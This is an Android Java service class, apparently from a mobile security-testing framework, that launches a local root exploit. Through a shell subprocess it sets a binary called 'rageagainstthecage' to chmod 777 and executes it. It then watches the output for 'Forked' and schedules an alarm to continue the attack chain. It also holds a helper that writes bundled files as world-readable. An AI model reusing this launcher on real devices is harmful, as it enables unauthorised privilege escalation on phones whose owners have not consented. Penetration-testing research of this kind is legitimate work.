package com.bulbsecurity.framework;

import jackpal.androidterm.Exec;

import java.io.FileDescriptor;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.util.Calendar;

import android.app.Service;
import android.app.AlarmManager;

import android.app.PendingIntent;
import android.content.Context;

import android.content.Intent;

import android.os.IBinder;








public class Phase1 extends Service {


	@Override
	public void onCreate() {
		
	}
	
	@Override
	public void onStart(Intent intent, int startID)  {
		try {
			//SaveIncludedFileIntoFilesFolder(R.raw.rageagainstthecage, "rageagainstthecage", getApplicationContext());
		} catch (Exception e) {

			e.printStackTrace();
		}

		final int[] processId = new int[1];
		final FileDescriptor fd = Exec.createSubprocess("/system/bin/sh", "-", null, processId);

		final FileOutputStream out = new FileOutputStream(fd);
		final FileInputStream in = new FileInputStream(fd);

		
		new Thread() {
			public void run() {
				byte[] mBuffer = new byte[4096];
				int read = 0;
				while (read >= 0) {
					try {
						read = in.read(mBuffer);
						String str = new String(mBuffer, 0, read);
						if (str.contains("Forked")) {

							Intent intent = new Intent(getApplicationContext(), AlarmReceiver.class);
							PendingIntent sender = PendingIntent.getBroadcast(getApplicationContext(), 0, intent, 0);

							AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);

							Calendar cal = Calendar.getInstance();
							cal.add(Calendar.SECOND, 5);
							am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), sender);
							

						}
						
					} catch (Exception e) {
						read = -1;
						e.printStackTrace();
					}
				}
			};
		}.start();

		try {
			String command = "chmod 777 " + getFilesDir() + "/rageagainstthecage\n";
			out.write(command.getBytes());
			out.flush();
			command = getFilesDir() + "/rageagainstthecage\n";
			out.write(command.getBytes());
			out.flush();
		} catch (Exception ex) {
			ex.printStackTrace();
		}
	}

	public static void SaveIncludedFileIntoFilesFolder(int resourceid, String filename, Context ApplicationContext) throws Exception {
		InputStream is = ApplicationContext.getResources().openRawResource(resourceid);
		FileOutputStream fos = ApplicationContext.openFileOutput(filename, Context.MODE_WORLD_READABLE);
		byte[] bytebuf = new byte[1024];
		int read;
		while ((read = is.read(bytebuf)) >= 0) {
			fos.write(bytebuf, 0, read);
		}
		is.close();
		fos.getChannel().force(true);
		fos.flush();
		fos.close();
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		// TODO Auto-generated method stub
		return null;
	}
	public void onDestroy() {
	
	}
}

